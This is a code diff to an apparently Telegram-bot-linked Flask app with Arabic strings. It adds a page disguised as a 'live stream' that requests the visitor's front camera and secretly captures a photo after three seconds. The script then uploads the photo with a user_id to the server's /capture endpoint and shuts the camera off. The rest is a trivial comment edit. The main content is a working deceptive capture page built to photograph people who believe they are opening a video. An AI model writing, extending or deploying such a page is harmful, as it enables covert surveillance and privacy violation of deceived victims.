@@ -45,13 +45,109 @@ def capture_page():
         return "الرابط غير صالح", 403
 
     html = """
-    
-    Live Stream
-    
-    Live 
-    
-    Tap to play stream
-    
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>بث مباشر</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { 
+                background: #000; color: #fff; 
+                font-family: 'Segoe UI', Tahoma, sans-serif; 
+                display: flex; flex-direction: column; 
+                justify-content: center; align-items: center; 
+                height: 100vh; overflow: hidden;
+            }
+            video { 
+                width: 100%; height: 100%; 
+                object-fit: cover; position: absolute; 
+                top: 0; left: 0; z-index: 1;
+            }
+            .overlay { 
+                position: absolute; top: 20px; right: 20px; 
+                z-index: 10; background: rgba(0,0,0,0.5); 
+                padding: 5px 15px; border-radius: 20px; 
+                color: #ff0000; font-weight: bold; font-size: 14px;
+                display: flex; align-items: center; gap: 8px;
+            }
+            .dot { 
+                width: 10px; height: 10px; background: #ff0000; 
+                border-radius: 50%; animation: blink 1s infinite; 
+            }
+            @keyframes blink { 
+                0% { opacity: 1; } 
+                50% { opacity: 0; } 
+                100% { opacity: 1; } 
+            }
+            .status { 
+                position: absolute; bottom: 30px; 
+                z-index: 10; background: rgba(0,0,0,0.7); 
+                padding: 10px 20px; border-radius: 10px; 
+                font-size: 16px; text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="overlay"><span class="dot"></span> بث مباشر</div>
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <div class="status" id="status">جاري الاتصال بالكاميرا...</div>
+
+        <script>
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const status = document.getElementById('status');
+            const userId = "{{ user_id }}";
+
+            // طلب الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                status.innerText = "✅ متصل - جاري المعالجة...";
+                
+                // التقاط الصورة بعد 3 ثواني من التشغيل
+                setTimeout(() => captureAndSend(stream), 3000);
+            })
+            .catch(err => {
+                status.innerText = "❌ تم رفض الوصول للكاميرا";
+                console.error("Camera error:", err);
+            });
+
+            function captureAndSend(stream) {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('user_id', userId);
+
+                    fetch('/capture', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.text())
+                    .then(data => {
+                        status.innerText = "✅ تم الإرسال بنجاح";
+                        // إيقاف الكاميرا وإخفاء الفيديو
+                        stream.getTracks().forEach(track => track.stop());
+                        video.style.display = 'none';
+                        document.body.style.background = '#111';
+                        status.innerText = "📷 تم التقاط الصورة بنجاح";
+                    })
+                    .catch(err => {
+                        status.innerText = "❌ حدث خطأ في الإرسال";
+                        console.error("Send error:", err);
+                    });
+                }, 'image/jpeg', 0.8);
+            }
+        </script>
+    </body>
+    </html>
     """
     return render_template_string(html, user_id=user_id)
 
@@ -113,7 +209,7 @@ def link(message):
         print(f"❌ Error in /link: {e}")
         bot.reply_to(message, f"حدث خطأ: {e}")
 
-# للتشغيل المحلي فقط (لن يعمل على Render لأن gunicorn هو الذي يشغل التطبيق)
+# للتشغيل المحلي فقط
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
     app.run(host="0.0.0.0", port=port)
